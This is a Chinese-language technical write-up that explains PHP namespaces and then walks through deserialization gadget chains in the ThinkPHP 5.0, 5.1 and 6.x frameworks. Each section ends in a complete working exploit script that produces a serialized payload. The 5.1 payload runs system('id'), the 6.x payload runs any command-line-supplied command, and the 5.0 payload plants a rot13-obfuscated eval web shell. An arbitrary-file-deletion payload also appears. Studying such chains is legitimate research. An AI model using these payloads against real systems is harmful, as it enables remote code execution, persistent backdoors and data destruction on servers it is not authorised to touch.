## 命名空间

命名空间的声明可避免类或函数名重复导致的各种问题。使用namespace可以声明、切换命名空间。

    
    
    <?php
    namespace first;
    echo "当前命名空间",__NAMESPACE__,"\n";
    
    namespace second;
    echo "当前命名空间",__NAMESPACE__,"\n";
    ?>
    /*运行结果
     *当前命名空间first
     *当前命名空间second
     */
    

在不同命名空间内可以定义同名类,有多个命名空间时，默认为最后一次声明的空间.若要使用其他命名空间的类，则需要在类前加入命名空间，直接使用其他命名空间的类会出错

    
    
    <?php
    namespace first;
    class wow{
    	function __construct(){
    	echo "当前命名空间",__NAMESPACE__,"\n";
    	}
    }
    class fine{
    	function __construct(){
    		echo "I'm fine thank u\n";
    	}
    }
    
    namespace second;
    class wow{
    	function __construct(){
    		echo "当前命名空间",__NAMESPACE__,"\n";
    	}
    }
    
    new wow();
    echo "正确的创建fine\n";
    new \first\fine();			//需要有反斜杠在前
    echo "错误的创建fine\n";
    new fine();
    
    ?>
    

![image-20201211152329787.png](https://image.3001.net/images/20210219/1613715333_602f5785bd9df37d1cf71.png!small)

## TPv5.1 漏洞

Thinkphp v5.1.39LTS

POP链为:`Windows::__destruct --> Pivot::__toString --> Request::__call
-->Request::isAjax --> Request::param --> Request::input -->
Request::filterValue -->call_user_func`,

Windows类`thinkphp/library/think/process/pipes/Windows.php`

![image-20201211165548246.png](https://image.3001.net/images/20210219/1613715362_602f57a201b1d809ba6c9.png!small)

跟踪removeFiles()  
![image-20201211165624637.png](https://image.3001.net/images/20210219/1613715370_602f57aa99c3063cdad96.png!small)

该函数功能，遍历Windows->files属性，若存在该属性指定的文件，则删除。$this->files完全可控，故可删除任意文件，例如

    
    
    <?php
    
    namespace think\process\pipes;
    use think\Process;
    class Pipes{}
    class Windows extends Pipes{
    	private $files = [];
    	function __construct(){
    		$this->files = ["D://del.txt"];
    	}
    }
    
    echo urlencode(serialize(New Windows()))."\n";
    
    ?>
    //运行结果
    //O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A11%3A%22D%3A%2F%2Fdel.txt%22%3B%7D%7D
    

![image-20201211171340551.png](https://image.3001.net/images/20210219/1613715381_602f57b59b0b6be83d670.png!small)

![image-20201211171452395.png](https://image.3001.net/images/20210219/1613715389_602f57bdaa91c16b4bb42.png!small)

removeFiles函数第163行，以file_exist函数处理`$filename`,file_exist函数会将参数当作字符串处理，倘若使得$filename为一个拥有__toString方法的对象则可触发__toString方法。

Pivot类的__toString方法来自父类Model,而Model的__toString方法则来自trait类Conversion

![image-20201212162835272.png](https://image.3001.net/images/20210219/1613715445_602f57f506e7d20da2721.png!small)

Conversion类__toString链如下

![image-20201211174255189.png](https://image.3001.net/images/20210219/1613715404_602f57cc01209f05b3679.png!small)

![image-20201211174316180.png](https://image.3001.net/images/20210219/1613715411_602f57d33d7fb6569a0d3.png!small)

toArray代码过长，截取有用部分如下

![image-20201212152957353.png](https://image.3001.net/images/20210219/1613715421_602f57ddf2caaf2fac6fc.png!small)

其间$relation变量来自$this->data[$name],而$name变量则来自$this->append,此两者皆可控。若使得$relation为拥有可利用visible方法或者不拥有visible方法但拥有可利用__call方法的对象，则可进入下一步利用。

__call这里找到Request类，如下

![image-20201212153508923.png](https://image.3001.net/images/20210219/1613715430_602f57e60384c3d74717c.png!small)

由于$this->hook可控，我们可以轻易执行到call_user_func_array.但又由于代码330行array_unshift的存在，使得Request对象被放置到$args的首位，导致我们无法在此处执行任意代码(因为参数不可控)，故需要再次寻找第一个参数不太影响结果的函数构造可利用链。

这里找到Request::isAjax,并跟踪

![image-20201212164721041.png](https://image.3001.net/images/20210219/1613715455_602f57ffea24ba37a9e49.png!small)

![image-20201212164824733.png](https://image.3001.net/images/20210219/1613715462_602f58069ed3462d35bd5.png!small)

跟踪input

![image-20201212165708013.png](https://image.3001.net/images/20210219/1613715492_602f582460e17b3805fac.png!small)

$name来自config['var_ajax']，可控,$data来自$this->param，也可控.

跟踪filterValue,其间执行了call_user_func($filter, $value)

![image-20201212165333734.png](https://image.3001.net/images/20210219/1613715470_602f580e5b5e982cc305c.png!small)

$value来自input中的$data,故最终来自$this->param,$filter在调用getFilter函数后获得

![image-20201212165520618.png](https://image.3001.net/images/20210219/1613715479_602f5817cdae43d9b1dc5.png!small)

其间$this->filter可控，故$filter可控。由于$filter,$value皆可控，故可执行任意代码，再回看一次pop链

`Windows::__destruct --> Pivot::__toString --> Request::__call
-->Request::isAjax --> Request::param --> Request::input -->
Request::filterValue -->call_user_func`

### exp

倘若要执行system('id'),则需要控制变量为以下值

    
    
    Request->filter = "system";
    Request->param = array('id');
    Request->hook['visible'] = [$this,"isAjax"];
    Request->config['var_ajax'] = '';
    Pivot->data = ["azhe" => new Request()];
    Pivot->append = ["azhe" => ["4ut","15m"]];
    Windows->files = [new Pivot()];
    
    ---exp---    <?php
    
    namespace think;
    abstract class Model{
    	private $data = [];
    	protected $append = [];
    	public function __construct(){
    		$this->data = ["azhe" => new Request()];
    		$this->append = ["azhe" => ["4ut","15m"]];
    	}
    }
    
    class Request{
    	protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '_ajax',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        protected $param = [];
        protected $hook = [];
        protected $filter;
        public function __construct(){
        	$this->filter = "system";
        	$this->hook = ["visible" => [$this, "isAjax"]];
        	$this->param = array('id');			//可以在这里写定命令，也可不在此设定，param函数会通过提交的参数来更新该值，故也可直接在地址栏提交任意参数执行命令
            $this->config['var_ajax'] = '';
        }
    }
    
    namespace think\process\pipes;
    use think\Model\Pivot;
    class Windows{
    	private $files ;
        public function __construct(){
            $this->files = [new Pivot()];
        }
    }
    
    namespace think\model;
    use think\Model;
    class Pivot extends Model{
    }
    
    use think\process\pipes\Windows;
    echo urlencode(serialize(new Windows()))."\n";
    ?>
    

![image-20210111122917164.png](https://image.3001.net/images/20210219/1613715523_602f5843b92c9e144338c.png!small)

![image-20210111123020971.png](https://image.3001.net/images/20210219/1613715530_602f584a9c3266129a0b0.png!small)

## TPv6.x 漏洞

POP链`Model->__destruct() --> Model->save() --> Model->updateData() -->
Model->checkAllowFields() --> Conversion->__toString() -->
Conversion->toJson() --> Conversion->toArray() --> Attribute->getAttr() -->
Attribute->getValue()`

先看反序列化起点`Model->__destruct()`

![image-20201215155159684.png](https://image.3001.net/images/20210219/1613715553_602f586115e0654e82d4f.png!small)

当`$this->lazySave == true`时调用save,跟踪如下

![image-20201215160137309.png](https://image.3001.net/images/20210219/1613715562_602f586ace5685abca8d6.png!small)

要想调用updateData,需要绕过第一个if并且`$this->exists == true`

if的绕过需要使isEmpty()返回false并且trigger()返回true

跟踪isEmpty(),当`$this->data`不为空时返回false

![image-20201215160306152.png](https://image.3001.net/images/20210219/1613715572_602f58742d02bf2a3b1e2.png!small)

跟踪trigger(),当`$this->withEvent ==
false`时trigger()返回true.(PS:trigger()所属类为ModelEvent)

![image-20201215160523876.png](https://image.3001.net/images/20210219/1613715579_602f587ba86db50f11a99.png!small)

绕过后，跟踪updateData().

![image-20201215160855388.png](https://image.3001.net/images/20210219/1613715587_602f588307687e460fa66.png!small)

要想调用checkAllowFields需要绕过第二个if.跟踪getChangedData()查看`$data`的获取

![image-20201215161007354.png](https://image.3001.net/images/20210219/1613715595_602f588b1370650f3458b.png!small)

当`$this->force == true`时，`$data`可控并且就为`$this->data`的值

跟踪checkAllowFields().这里已经可以看到一个`__toString`触发点，除了这一个触发点，还有一个触发点就是db()

![image-20201215161210423.png](https://image.3001.net/images/20210219/1613715603_602f589333b2445746998.png!small)

跟踪db().进行字符串拼接处即是触发点。只要使`$this->table、$this->name或$this->suffix`为拥有`__toString`方法的对象即可。

![image-20201215161346336.png](https://image.3001.net/images/20210219/1613715610_602f589ad0cb22945f23e.png!small)

要想执行到触发点，需要绕过updateData的第2个和第3个if,也即是`$this->field(默认为空)与$this->schema(默认为空)`为空

![image-20201215161702962.png](https://image.3001.net/images/20210219/1613715619_602f58a3c4350a7684630.png!small)

以上即是`__destruct`链，总结一下需要设置的属性如下

    
    
    Model->lazySave = true;
    Model->exists = true;
    Model->withEvent = false
    Model->force = true;
    Model->data不为空
    Model->name(或table、suffix)为某对象
    

下面看`__toString`链

`Conversion->__toString`

![image-20201215162150147.png](https://image.3001.net/images/20210219/1613715627_602f58abd4904d9f6eea4.png!small)

跟踪toArray()

![image-20201215162247078.png](https://image.3001.net/images/20210219/1613715635_602f58b364209a7cac0a0.png!small)

要调用getAttr()首先需要绕过if.

`$data`来自`$this->data`和`$this->relation`,当`$data`的`value`不是Model或ModelCollection实例时即可通过第一个if，若设置`$this->visible`则在173行调用getAttr,不设置则在175行调用，没有影响.

跟进getAttr()

![image-20201215162834991.png](https://image.3001.net/images/20210219/1613715643_602f58bb100854d4376fc.png!small)

调用getData获取到`$value`,跟进

![image-20201215163001255.png](https://image.3001.net/images/20210219/1613715650_602f58c278ffa59a06925.png!small)

跟进getRealFieldName()

![image-20201215163031563.png](https://image.3001.net/images/20210219/1613715658_602f58ca7c4156ff576e1.png!small)

当`$this->strict ==
true(默认也为true)`时，返回`$name`(name即是`$this->data`的key).也即是`$fieldName`终值为`$this->data`的key.

代码279行的if,当`$this->data`中存在`$fieldName`键时，返回对应键的值。故`$value`最终值为`$this->data[$fieldName]`

跟进getValue()

![image-20201215163450594.png](https://image.3001.net/images/20210219/1613715666_602f58d26723d5ab201bb.png!small)

代码第496行，$closure完全可控，第497行触发rce.

先看调用getValue()传入的参数，`$name、$value、$relation`,这三者分别为`$this->data的key,$this->data的value,false`

因为`$this->withAttr[$fieldName]`可控并且`$relation == false`,故程序会执行到497行。

以上则为`__toString`链，总结需要设置的内容如下

    
    
    $this->data = array('azhe'=>'whoami');
    $this->withAttr = array('azhe'=>[])
    Conversion类为trait类，需要寻找使用了它的类，这里可以用Pivot类
    
    上下文总结如下
    $Model->lasySave = true;
    $Model->exists = true;
    $Model->withEvent = false;
    $Model->force = true;
    $Model->name = new Pivot();
    $Model->data = array('azhe'=>'whoami');
    $Model->withAttr = array('azhe'=>'system');
    

### exp

    
    
    <?php
    /*Model->__destruct()
     *Model->save()
     *Model->updateData()
     *Model->checkAllowFields()
     *Conversion->__toString()
     *Conversion->toJson()
     *Conversion->toArray()
     *Conversion->getAttr()
     *Conversion->getValue()
     */
    namespace think;
    abstract class Model{
    	private $exists;
    	private $force;
    	private $lazySave;
    	protected $name;
    	protected $withEvent;
    	private $data;
        private $withAttr;
    
    	public function __construct($obj = null,$cmd = ''){
    		$this->lazySave = true;
    		$this->exists = true;
    		$this->withEvent = false;
    		$this->force = true;
    		$this->name = $obj;
    		$this->data = array('azhe'=>"${cmd}");
        	$this->withAttr = array('azhe'=>'system');
    	}
    }
    
    namespace think\model;
    use think\Model;
    class Pivot extends Model{
    }
    
    $a = new Pivot();
    $b = new Pivot($a,$argv[1]);
    echo urlencode(serialize($b))."\n";
    ?>
    

![image-20201215165518309.png](https://image.3001.net/images/20210219/1613715679_602f58df4769bf85b4eb5.png!small)

## TPv5.0 漏洞

POP链`Windows->__destruct() --> Windows->removeFiles() --> Model->__toString
--> Model->toJson() --> Model->toArray() --> Output->__call --> Output->block
--> Output->writeln --> Output->write --> Memcache->write --> File->set`

首先看`__destruct`链,thinkphp/library/think/process/pipes/Windows.php:56

![image-20201217145904604.png](https://image.3001.net/images/20210219/1613715694_602f58ee38a5f95f226a3.png!small)

跟进removeFiles(),这里与TPv5.1相同，也存在任意文件删除，不再演示

![image-20201217145937628.png](https://image.3001.net/images/20210219/1613715701_602f58f5c115dd1fc4546.png!small)

再看`__toString`链，thinkphp/library/think/Model.php:2265

![image-20201217150118411.png](https://image.3001.net/images/20210219/1613715710_602f58fec15c220d2123f.png!small)

跟进toJson()

![image-20201217150142645.png](https://image.3001.net/images/20210219/1613715718_602f59063e9c00e3c50ca.png!small)

跟进toArray(),代码过多，截取关键部分

![image-20201217150304679.png](https://image.3001.net/images/20210219/1613715726_602f590e8bdf79f950cb7.png!small)

倘若`$value`可控，则可在此处触发`__call`

因为`$this->append`可控，所以`$name`可控，当`$name`不为数组，并且不含有`.`时，代码进入899行,跟进Loader::parseName();

![image-20201217150642699.png](https://image.3001.net/images/20210219/1613715734_602f591627e13988d121a.png!small)

即`$relation`可控为第一个字母小写的任意字符串

![image-20201217151802827.png](https://image.3001.net/images/20210219/1613715741_602f591d7813d50b87775.png!small)

代码第900-901行，我们可以调用该类(Model)的任意方法，并且将结果赋予`$modelRelation`

先跟进getRelationData()

![image-20201217152003698.png](https://image.3001.net/images/20210219/1613715749_602f5925bb2e81519c3f7.png!small)

跟进isSelfRelation()

![image-20201217152248727.png](https://image.3001.net/images/20210219/1613715757_602f592d65cec8d0dc14b.png!small)

跟进getModel(),这个getModel是Relation的类方法

![image-20201217154620928.png](https://image.3001.net/images/20210219/1613715765_602f59353377b1a10049c.png!small)

它的getModel又调用了`$this->query`的getModel,因为`$this->query`可控，故全局搜索getModel(),发现两个简单易用的getModel  
![image-20201217154829846.png](https://image.3001.net/images/20210219/1613715780_602f5944bf7a55faa1c32.png!small)

这两个getModel都是直接返回对象的`$this->model`,故$modelRelation->getModel()可控

可以发现，`$this->parent`可控，倘若`$modelRelation`也可控，那么`$value`就可控。回看`$modelRelation`,它为我们调用的、任一Model方法的返回值，查看Model类的方法，找到一简单可控的方法getError()

![image-20201217171930715.png](https://image.3001.net/images/20210219/1613715812_602f596423ea0f4c72b0b.png!small)

再往下看

![image-20201217172030689.png](https://image.3001.net/images/20210219/1613715819_602f596bf384eb4035627.png!small)

`$modelRelation`需要存在getBindAttr方法,全局搜索发现只有抽象类OneToOne存在该方法，并且该类也是Relation的子类。从这里看，我们需要让`$modelRelation`为OneToOne的子类.再往下看,`$bindAttr`可控

![image-20201217171821142.png](https://image.3001.net/images/20210219/1613715844_602f5984cec41d8f980ae.png!small)

到这，已经可以随便控制`$bindAttr`使代码执行到912行了。

912行，可以这样看

`$item[$bindAttr的key] = $this->parent ? $this->parent->getAttr($bindAttr[key])
: null`,`$bindAttr`与`$this->parent`皆可控

OneToOne的子类如下，`$modelRelation`可以任选其一

![image-20201217171744938.png](https://image.3001.net/images/20210219/1613715875_602f59a3e931ddce74592.png!small)

由于我们要使用Output类的`__call方法,`故需要使`$this->parent`为Output对象

`__toString`链需要构造以下内容

    
    
    Model->append = array('4ut15m'=>'getError');
    Model->error = new BelongsTo();	//或者HasOne
    Model->parent = new Output();
    OneToOne->selfRelation = false;
    OneToOne->query = new ModelNotFoundException();
    OneToOne->bindAttr = array('4ut15m');
    ModelNotFoundException->model = new Output();
    

再看`__call`链,thinkphp/library/think/console/Output.php:208

![image-20201217171705235.png](https://image.3001.net/images/20210219/1613715910_602f59c67dabda48ff850.png!small)

代码212行，调用当前对象的block方法，跟进block()

![image-20201217171605347.png](https://image.3001.net/images/20210219/1613715935_602f59dff004bf55e203c.png!small)

跟进writeln()

![image-20201217171542554.png](https://image.3001.net/images/20210219/1613715965_602f59fda124217d89a09.png!small)

`$this->handle`可控，全局搜索write方法,找到 Memcache::write

![image-20201217171459146.png](https://image.3001.net/images/20210219/1613715990_602f5a166284fb473135f.png!small)

其中`$this->handler`、`$this->config`都可控

全局搜索set方法,发现File::set

![image-20201217171431636.png](https://image.3001.net/images/20210219/1613716015_602f5a2f192a9f9c758ff.png!small)

因为`$this->options`可控，故`$expire`可控,`$name`和`Memcache->config`相关，半可控，跟进getCacheKey()

![image-20201217171406216.png](https://image.3001.net/images/20210219/1613716022_602f5a36dac46496bc4c2.png!small)

至此`$filename`路径可控,`$name`为可以确定的md5值

写入文件的内容`$data`由`$value`和`$expire`组成，追溯前者其不可控，值为true。后者则由于格式化输出的原因无法控制。跟进setTagItem()

![image-20201217171331664.png](https://image.3001.net/images/20210219/1613716031_602f5a3f6594d61dd7644.png!small)

代码在200行又调用了set方法，并且写入内容$value为传入的参数`$name`也即是前文的`$filename`,路径部分可控。这里可以通过php伪协议`php://write`写入shell,如下

`php://filter/write=string.rot13/resource=<?cuc @riny($_CBFG['4hg15z']);?>`

![image-20201218150751612.png](https://image.3001.net/images/20210219/1613716058_602f5a5a3ff5fbc9fa36b.png!small)

`__call`链需要构造以下内容

    
    
    Output->styles = ['getAttr'];
    Output->handle = new Memcache();
    Memcache->handler = new File();
    File->options = ['expire'        => 0,
            	'cache_subdir'  => false,	//设置为false可控制写入的文件在默认路径下
            	'prefix'        => '',
            	'path'          => 'php://filter/write=string.rot13/resource=<?cuc @riny($_CBFG[\'4hg15z\']);?>',
            	'data_compress' => false];
    

### exp

    
    
    <?php
    
    namespace think\process\pipes;
    use think\model\Pivot;
    //Windows类
    class Windows{
    	private $files;	
    	public function __construct(){
    		$this->files = array(new Pivot());	
    	}
    }
    
    namespace think\model;
    use think\model\relation\BelongsTo;
    use think\console\Output;
    //Pivot类
    class Pivot {
    	public $parent;	
    	protected $error;
    	protected $append;
    	
    	public function __construct(){
    		$this->append = array('4ut15m' => 'getError');
    		$this->error = new BelongsTo();		
    		$this->parent = new Output();	
    	}
    }
    
    namespace think\model\relation;
    use think\db\exception\ModelNotFoundException;
    //BelongsTo类
    class BelongsTo {
    	protected $parent;
    	protected $query;
    	protected $selfRelation;
    	protected $bindAttr;
    
    	public function __construct(){
    		$this->selfRelation = false;
    		$this->query = new ModelNotFoundException();		
    		$this->bindAttr = array('4ut15m');
    	}
    
    }
    
    namespace think\console;
    use think\session\driver\Memcache;
    //Output类
    class Output{
    	private $handle;
        protected $styles;
    
    	public function __construct(){
    		$this->styles = ['getAttr'];
    		$this->handle = new Memcache();	
    	}
    }
    
    namespace think\db\exception;
    use think\console\Output;
    //ModelNotFoundException类
    class ModelNotFoundException{
    	protected $model ;
    
    	public function __construct(){
    		$this->model = new Output();	
    	}
    }
    
    namespace think\session\driver;
    use think\cache\driver\File;
    //Memcache类
    class Memcache{
    	protected $handler;
    
    	public function __construct(){
    		$this->handler = new File();
    	}
    }
    
    namespace think\cache\driver;
    use think\cache\Driver;
    //File类
    class File {
    	protected $tag;
    	protected $options;
    	public function __construct(){
    		$this->tag = '4ut15m';
    		$this->options = [
            	'expire'        => 0,
            	'cache_subdir'  => false,
            	'prefix'        => '',
            	'path'          => 'php://filter/write=string.rot13/resource=<?cuc @riny($_CBFG[\'4hg15z\']);?>',
            	'data_compress' => false,
        	];
    	}
    }
    
    use think\process\pipes\Windows;
    $windows = new Windows();
    echo urlencode(serialize($windows))."\n";
    ?>
    

![image-20201218152051695.png](https://image.3001.net/images/20210219/1613716077_602f5a6d85a02c11966fa.png!small)

![image-20201218152524058.png](https://image.3001.net/images/20210219/1613716087_602f5a772208b03cc81f5.png!small)

## 参考文献

1.[ThinkPHP5.0.x反序列化利用链](https://xz.aliyun.com/t/7082)  
2.[ThinkPHP5.1.X反序列化利用链](https://xz.aliyun.com/t/6467)  
3.[ThinkPHP6.X反序列化利用链](https://xz.aliyun.com/t/6479)

